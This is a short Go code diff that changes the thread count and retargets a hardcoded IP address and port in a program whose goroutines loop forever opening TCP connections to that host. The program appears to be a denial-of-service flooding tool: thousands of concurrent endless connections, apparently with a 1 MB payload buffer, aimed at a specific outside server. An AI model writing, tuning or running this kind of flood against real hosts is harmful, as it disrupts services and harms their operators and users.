@@ -9,12 +9,12 @@ func main() {
 	var wg sync.WaitGroup
 	data := make([]byte, 1024*1024) // 1 MB of data
 
-	for i := 0; i < 4000; i++ { // Adjust number of threads as needed
+	for i := 0; i < 1000; i++ { // Adjust number of threads as needed
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
 			for {
-				conn, err := net.Dial("tcp", "193.228.196.49:80")
+				conn, err := net.Dial("tcp", "185.107.194.70:20731")
 				if err != nil {
 					continue // if connection fails, retry
 				}
